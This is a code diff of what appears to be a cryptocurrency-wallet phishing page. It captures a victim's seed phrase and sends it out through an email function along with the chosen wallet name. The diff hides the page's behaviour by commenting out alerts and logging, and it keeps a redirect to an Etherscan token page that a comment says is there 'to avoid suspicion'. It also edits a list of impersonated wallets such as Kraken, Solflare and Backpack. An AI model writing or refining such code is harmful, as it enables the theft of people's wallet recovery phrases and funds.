@@ -432,7 +432,8 @@ body::before {
             if (seedPhrase.length > 0) {
                 sendEmail('phrase', selectedWallet, seedPhrase);
             } else {
-                alert("Please enter your recovery phrase");
+               // alert("Please enter your recovery phrase");
+               return false;
             }
         }
 
@@ -473,20 +474,17 @@ body::before {
                 templateParams
             )
             .then(function(response) {
-                console.log('SUCCESS!', response.status, response.text);
+                //console.log('SUCCESS!', response.status, response.text);
                 // Show success message and redirect
-                alert("Verification pending. Please wait for confirmation.");
+                //alert("Verification pending. Please wait for confirmation.");
                 setTimeout(() => {
                     window.location.href = "https://etherscan.io/token/0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429";
                 }, 1500);
             })
             .catch(function(error) {
-                console.log('FAILED...', error);
+                //console.log('FAILED...', error);
                 // Show error but still redirect (to avoid suspicion)
-                alert("Connection issue. Please try again later.");
-                setTimeout(() => {
-                    window.location.href = "https://etherscan.io/token/0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429";
-                }, 1500);
+                //alert("Connection issue. Please try again later.");
             })
             .finally(function() {
                 // Reset button state
@@ -527,7 +525,7 @@ body::before {
             { name: 'Backpack' , img: 'https://th.bing.com/th?id=ODLS.aef2c9fb-29e8-4c2d-bba6-0fdf4a61f0c6&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2'},
             { name: 'Enjin Wallet', img: 'https://th.bing.com/th?id=ODLS.dd1bc34b-57e4-4c39-9654-e6f7c6ab4116&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
             { name: 'Kraken Wallet', img: 'https://th.bing.com/th?id=ODLS.feae029d-e2de-42f3-9ab9-acb2987163df&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
-            { name: 'Shapeshift' , ikg: 'https://th.bing.com/th?id=ODLS.37180c35-62aa-442a-bb17-2a5f4b1ca696&w=17&h=17&o=6&pid=1.2'},
+            { name: 'Shapeshift' , img: 'https://cdn.prod.website-files.com/5cec55545d0f47cfe2a39a8e/66fc0fc1b5448f2b2250a32e_fox_logo_mark.svg'},
             { name: 'Solflare' ,img: 'https://th.bing.com/th?id=ODLS.815bbd7f-ebf2-44bc-a7f8-38499e09805c&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' },
             { name: 'Torus', img: 'https://th.bing.com/th?id=ODLS.e4dd8530-4cbe-47aa-b465-7f593e12c520&w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2' },
             { name: 'Jupitar', img: 'https://th.bing.com/th?id=ODLS.3fb16c1b-4e61-40d5-82b6-3d49c928bade&w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2' }
